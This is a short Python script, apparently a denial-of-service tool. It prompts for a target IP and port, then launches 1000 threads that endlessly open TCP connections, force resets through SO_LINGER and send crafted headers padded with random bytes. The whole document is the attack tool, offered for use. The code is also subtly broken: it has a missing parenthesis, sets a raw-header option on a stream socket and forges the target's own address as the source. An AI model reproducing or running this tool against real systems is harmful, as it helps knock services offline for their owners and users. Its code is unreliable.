import socket
import threading
import struct
import random

target_ip = str(input("IP : ")
target_port = int(input("Port : "))

# Attack function for sending rapid reset packets
def rapid_reset_attack():
    while True:
        ip_header = struct.pack('!BBHHHBBH4s4s', 
                                69, # Version & IHL
                                0, # Type of Service
                                40, # Total Length
                                54321, # Identification
                                0, # Flags & Fragment Offset
                                64, # TTL
                                socket.IPPROTO_TCP, # Protocol
                                0, # Header Checksum
                                socket.inet_aton(target_ip), # Source IP
                                socket.inet_aton(target_ip)
                                ) + random._urandom(666) # Menambahkan random bytes ke dalam paket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target_ip, target_port))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            s.send(ip_header)
        except socket.error:
            pass

# Creating and starting threads for rapid reset attack
for i in range(1000):
    thread = threading.Thread(target=rapid_reset_attack)
    thread.start()
